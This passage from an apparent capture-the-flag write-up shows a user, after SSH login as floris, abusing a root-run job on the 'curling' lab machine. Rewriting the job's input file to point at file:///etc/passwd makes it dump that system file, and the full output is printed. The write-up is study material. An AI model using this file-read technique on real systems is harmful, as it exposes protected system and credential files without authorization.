The attacker can SSH as `floris` using the credential extracted from the `password_backup` file.
```
floris@curling:~$ whoami
floris
floris@curling:~$ id
uid=1000(floris) gid=1004(floris) groups=1004(floris)
floris@curling:~$ sudo -l 
[sudo] password for floris:                                                  
Sorry, user floris may not run sudo on curling.
```

There is an admin-report directory that looks like a service running on (or grabbing from) localhost
```
floris@curling:~/admin-area$ file *
input:  ASCII text
report: HTML document, UTF-8 Unicode text, with very long lines, with CRLF, CR, LF line terminators
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"

```

The timestamps keep updating each minute...
```
floris@curling:~/admin-area$ ls -l
total 20
-rw-rw---- 1 root floris    25 Sep  6 00:03 input
-rw-rw---- 1 root floris 14247 Sep  6 00:03 report
floris@curling:~/admin-area$ date
Sat Sep  6 00:03:50 UTC 2025
floris@curling:~/admin-area$ ls -l
total 20
-rw-rw---- 1 root floris    25 Sep  6 00:04 input
-rw-rw---- 1 root floris 14247 Sep  6 00:04 report

```


## Reading files
The `input` file can be rewritten, producing output in `report`
```
floris@curling:~/admin-area$ echo -n 'url = "file:///etc/passwd"' > input 

### wait a minute...

floris@curling:~/admin-area$ cat report 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
floris:x:1000:1004:floris:/home/floris:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false

```


